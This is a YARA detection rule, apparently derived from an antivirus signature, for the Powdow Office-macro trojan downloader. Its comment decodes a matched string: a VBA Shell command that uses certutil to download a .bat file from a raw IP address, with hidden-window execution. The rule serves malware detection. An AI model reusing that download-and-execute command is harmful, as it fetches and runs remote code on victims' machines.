
rule TrojanDownloader_O97M_Powdow_SPD_MTB{
	meta:
		description = "TrojanDownloader:O97M/Powdow.SPD!MTB,SIGNATURE_TYPE_MACROHSTR_EXT,02 00 02 00 02 00 00 "
		
	strings :
		$a_01_0 = {3d 20 53 68 65 6c 6c 28 22 63 6d 64 20 2f 63 20 63 65 72 74 75 74 69 6c 2e 65 78 65 20 2d 75 72 6c 63 61 63 68 65 20 2d 73 70 6c 69 74 20 2d 66 20 22 22 68 74 74 70 3a 2f 2f 32 30 2e 34 30 2e 39 37 2e 39 34 2f 69 74 6c 2f 6c 6f 61 64 65 72 2f 75 70 6c 6f 61 64 73 2f 45 51 4e 37 32 31 30 36 30 36 32 36 31 31 2e 62 61 74 22 } //1 = Shell("cmd /c certutil.exe -urlcache -split -f ""http://20.40.97.94/itl/loader/uploads/EQN72106062611.bat"
		$a_03_1 = {2e 65 78 65 2e 65 78 65 20 26 26 20 [0-0f] 2e 65 78 65 2e 65 78 65 22 2c 20 76 62 48 69 64 65 29 } //1
	condition:
		((#a_01_0  & 1)*1+(#a_03_1  & 1)*1) >=2
 
}